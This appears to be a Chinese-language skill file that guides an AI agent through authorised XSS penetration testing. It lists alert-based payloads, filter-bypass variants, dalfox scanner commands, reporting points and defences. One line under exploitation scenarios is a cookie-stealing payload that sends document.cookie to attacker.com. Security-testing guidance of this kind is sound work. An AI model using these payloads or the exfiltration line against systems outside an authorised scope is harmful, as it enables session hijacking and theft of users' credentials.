---
name: xss-testing
description: XSS跨站脚本攻击测试的专业技能
version: 1.0.0
---

# XSS测试技能

## 使用边界与发散原则

- 本 skill 是最低覆盖要求、风险清单和证据标准，不是唯一测试路径或固定脚本。执行时必须根据目标技术栈、入口形态、认证状态、业务流程、已有证据、WAF/限速和授权范围调整方法。
- 文中的步骤、payload、命令、工具名和执行顺序默认是候选方法；除非本 skill、系统提示或后端门禁明确写为“必须/禁止/强制”，不要照抄固定列表，也不要因为示例没覆盖某个旁路、协议、参数位置、文件格式或业务入口就跳过。
- 发现阶段的字符串、端点、token、id、报错、组件名和扫描命中只作为候选信号；先记录和复核，不要仅凭单个关键词直接认定漏洞或加载多个无关专项流程。只有交互证据、可复现行为或明确进入对应专项测试时，才提升为专项验证。
- 每一步都应输出证据、判断理由和下一步分支；工具失败时先修参数、配置、环境或改用更合适的专业工具，确认无法覆盖时再使用通用命令兜底。
- 授权范围、低噪声、数据最小化、复现证据、误报排除和报告要求是硬边界；这些约束高于任何示例命令或默认流程。

## 概述

跨站脚本攻击(XSS)允许攻击者在受害者的浏览器中执行恶意JavaScript代码。本技能涵盖反射型、存储型和DOM型XSS的测试方法。

## XSS类型

### 1. 反射型XSS (Reflected XSS)
- 恶意脚本通过URL参数传递
- 服务器直接返回包含脚本的响应
- 需要用户点击恶意链接

### 2. 存储型XSS (Stored XSS)
- 恶意脚本存储在服务器（数据库、文件等）
- 所有访问受影响页面的用户都会执行脚本
- 影响范围更大

### 3. DOM型XSS (DOM-based XSS)
- 客户端JavaScript处理用户输入不当
- 不涉及服务器端处理
- 通过修改DOM结构触发

## 测试方法

**重要：以下 payload 仅为参考方向。必须先分析目标的WAF规则、过滤逻辑、输出上下文（HTML/JS/属性/URL），然后动态构造针对性payload。禁止无脑照搬固定列表。**

### 基础Payload
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### 绕过过滤

#### 大小写绕过
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
```

#### 编码绕过
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

#### 事件处理器
```javascript
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<div onmouseover=alert('XSS')>hover</div>
<input onfocus=alert('XSS') autofocus>
```

#### 伪协议
```javascript
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')">
```

### 高级绕过技术

#### 使用String.fromCharCode
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### 使用eval和atob
```javascript
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

#### 使用HTML实体
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

## 工具使用

### dalfox
```bash
# 基础扫描
dalfox url "http://target.com/page?q=test"

# 指定参数
dalfox url "http://target.com/page" -d "q=test" -X POST

# 使用自定义payload
dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
```

### Burp Suite
- 使用Intruder模块进行批量测试
- 使用Repeater手动测试
- 使用Scanner自动检测

### 浏览器控制台
- 测试DOM型XSS
- 检查JavaScript执行环境
- 调试payload

## 验证和利用

### 验证步骤
1. 确认payload被执行
2. 检查是否被过滤或编码
3. 测试不同上下文（HTML、JavaScript、属性等）
4. 评估影响（Cookie窃取、会话劫持等）

### 利用场景
- Cookie窃取：`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
- 键盘记录：注入键盘事件监听器
- 钓鱼攻击：伪造登录表单
- 会话劫持：获取用户会话token

## 报告要点

- XSS类型（反射/存储/DOM）
- 触发位置和参数
- 完整的POC
- 影响评估
- 修复建议（输出编码、CSP策略等）

## 防护措施

- 输入验证和过滤
- 输出编码（HTML、JavaScript、URL）
- Content Security Policy (CSP)
- HttpOnly Cookie标志
- 使用安全的框架和库
